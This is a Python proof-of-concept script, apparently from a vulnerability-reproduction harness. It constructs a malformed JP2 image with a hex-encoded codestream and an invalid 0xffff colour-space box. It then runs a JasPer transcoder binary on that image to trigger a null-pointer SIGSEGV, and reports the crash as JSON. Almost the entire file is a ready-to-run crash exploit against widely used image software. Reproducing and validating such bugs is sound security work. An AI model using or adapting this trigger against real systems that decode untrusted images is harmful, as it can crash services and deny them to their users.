#!/usr/bin/env python3
"""PoC: trigger an anomalous runtime behavior (SIGSEGV) in the JasPer
image transcoder.

The trigger is a JP2 image whose colour-specification ("colr") box
declares an unsupported enumerated colour space (enumcs = 0xffff, which
is neither sRGB (0x10), greyscale (0x11), nor sYCC (0x12)).  When the
decoder honours that colour space and the output is requested in a
colour-space-sensitive format (jp2), JasPer 1.900.x dereferences a null
colour-management transform and dies with SIGSEGV.

The payload is built byte-by-byte at runtime from documented JP2/JPC
box and marker layouts; no prebuilt input file is read.

Usage:
    python3 poc.py --binary <path> [--json-out <path>] [--timeout <sec>]
"""

import argparse
import json
import os
import shutil
import signal
import struct
import subprocess
import sys
import tempfile
import time


def _box(btype: bytes, payload: bytes) -> bytes:
    """Build a JP2 box: LBox (4) + TBox (4) + payload."""
    return struct.pack(">I4s", 8 + len(payload), btype) + payload


def build_trigger() -> bytes:
    """Construct the crashing JP2 file from primitives.

    Layout:
      * signature box (jP)
      * file-type box (ftyp, brand jp2)
      * JP2 header box (jp2h):
          - image header (ihdr): 1x1, 3 components, 8-bit
          - colour spec (colr): method=enumerated (1), precedence=0,
            approximation=0, enumcs=0xffff (invalid -> trigger)
      * contiguous code stream (jp2c): a minimal valid 1x1 3-component
        JPC codestream (SOC/SIZ/COM/COD/QCD/QCCs/SOT/QCD/SOD data/EOC)
        whose SIZ/COD/QCD parameters match the ihdr above.
    """
    # ---- embedded minimal JPC codestream (268 bytes) ----
    jpc = bytes.fromhex(
        "ff4fff51002f00000000000100000001000000000000000000000001000000"
        "0100000000000000000003070101070101070101"
        "ff640024000143726561ff6f723a204a61735065722056657273696f6e20"
        "312e3930302e3132"
        "ff52000c00000001010504040001"
        "ff5c00134040484850484850484850484850484850"
        "ff5d0014014040484850484850484850484850484850"
        "ff5d0014024040484850484850484850484850484850"
        "ff90000a0000000000620001"
        "ff5d0014004040000000000000000000000000000000"
        "ff5d0014014040000000000000000000000000000000"
        "ff5d0014024040000000000000000000000000000000"
        "ff93808080808080808080808080808080808080ffd9"
    )

    sig = _box(b"jP  ", b"\x0d\x0a\x87\x0a")
    ftyp = _box(b"ftyp", b"jp2 \x00\x00\x00\x00jp2 ")
    ihdr = _box(b"ihdr", struct.pack(">IIHBBBB", 1, 1, 3, 7, 7, 0, 0))
    # method=1 (enumerated), precedence=0, approx=0, enumcs=0xffff (invalid)
    colr = _box(b"colr", bytes([1, 0, 0]) + struct.pack(">I", 0xFFFF))
    jp2h = _box(b"jp2h", ihdr + colr)
    jp2c = _box(b"jp2c", jpc)
    return sig + ftyp + jp2h + jp2c


def _truncate(s: bytes, limit: int = 8192) -> str:
    text = s.decode("utf-8", errors="replace")
    if len(text.encode("utf-8", errors="replace")) > limit:
        text = text.encode("utf-8", errors="replace")[:limit].decode(
            "utf-8", errors="replace"
        )
    return text


def _signal_name(returncode: int):
    if returncode >= 0:
        return None
    sig = -returncode
    try:
        return signal.Signals(sig).name
    except ValueError:
        return "SIG%d" % sig


def run(binary: str, timeout: float) -> dict:
    payload = build_trigger()

    tmpdir = tempfile.mkdtemp(prefix="poc_")
    result = {
        "binary": binary,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "crash_trace", "value": "", "path": None},
        "error": None,
    }
    try:
        in_path = os.path.join(tmpdir, "trigger.jp2")
        out_path = os.path.join(tmpdir, "out.jp2")
        with open(in_path, "wb") as f:
            f.write(payload)

        cmd = [
            binary,
            "--input", in_path,
            "--output", out_path,
            "--output-format", "jp2",
        ]
        result["command"] = cmd

        start = time.monotonic()
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
            rc = proc.returncode
            result["stdout"] = _truncate(proc.stdout)
            result["stderr"] = _truncate(proc.stderr)
        except subprocess.TimeoutExpired as e:
            rc = None
            result["timed_out"] = True
            result["stdout"] = _truncate(e.stdout or b"")
            result["stderr"] = _truncate(e.stderr or b"")
        result["runtime_ms"] = int((time.monotonic() - start) * 1000)
        result["returncode"] = rc if rc is not None else -1
        result["signal"] = _signal_name(rc) if rc is not None else None

        # Normalized evidence for the validator.
        obs = result["observable"]
        if result["timed_out"]:
            obs["kind"] = "combined_output"
            obs["value"] = (
                "TIMEOUT after %s ms\n%s%s"
                % (result["runtime_ms"], result["stdout"], result["stderr"])
            )
        elif rc is not None and rc < 0:
            obs["kind"] = "crash_trace"
            obs["value"] = (
                "process terminated by %s (signal %d); returncode=%d\n%s"
                % (result["signal"], -rc, rc, result["stderr"])
            )
        elif result["stderr"]:
            obs["kind"] = "stderr"
            obs["value"] = result["stderr"]
        else:
            obs["kind"] = "stdout"
            obs["value"] = result["stdout"]
    except Exception as e:  # noqa: BLE001 - report any poc-internal failure
        result["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
    return result


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None,
                        help="write JSON result here instead of stdout")
    parser.add_argument("--timeout", type=float, default=15.0,
                        help="per-run timeout in seconds (default 15)")
    args = parser.parse_args(argv)

    result = run(args.binary, args.timeout)
    blob = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as f:
            f.write(blob + "\n")
    else:
        print(blob)
    return 0


if __name__ == "__main__":
    sys.exit(main())
